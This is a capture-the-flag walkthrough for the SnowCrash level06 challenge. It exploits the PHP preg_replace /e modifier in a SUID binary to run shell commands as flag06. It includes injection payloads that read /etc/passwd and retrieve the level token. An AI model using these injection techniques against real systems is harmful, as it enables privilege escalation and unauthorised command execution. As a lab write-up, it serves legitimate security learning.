- The directory `/home/user/level06` contains a binary which when executed applies the `level06.php` script to a file name passed to the binary as an argument. The SUID bit of the binary is set as flag06.

```
level06@SnowCrash:~$ pwd
/home/user/level06
level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

```

- In the `level06.php` the line `$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);` reveals a depreciated modifier `/e` which executes the matched and replaced string as php code.

- The pattern matches the line starting with `[x` and extracts the string following `[x` and executes it as  php code.

- In php the syntax ```${`<command>`};``` can be used in order to execute system commands. Furthermore we can run multiple code executions by chaining commands as per below test. We find the result of the command are displayed on screen as errors in php code execution and as per SUID bit set as `flag06` the `whoami` command reflect the binary is run and commands are executed as `flag06`


```
level06@SnowCrash:~$ cat /tmp/test
[x  ${`whoami`}; ${`cat /etc/passwd`}]

level06@SnowCrash:~$ ./level06 /tmp/test
PHP Notice:  Undefined variable: flag06
 in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
<snip>
```

- Replacing the payload with `getflag` command to execute it as the file owner `flag06` and obtain the flag
```
level06@SnowCrash:~$ echo '[x  ${`getflag`}]' > /tmp/payload
level06@SnowCrash:~$ ./level06 /tmp/payload
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
 
```

- Authenticate as `level07` using the token 

```
level06@SnowCrash:~$ su level07
Password: 
level07@SnowCrash:~$ 

```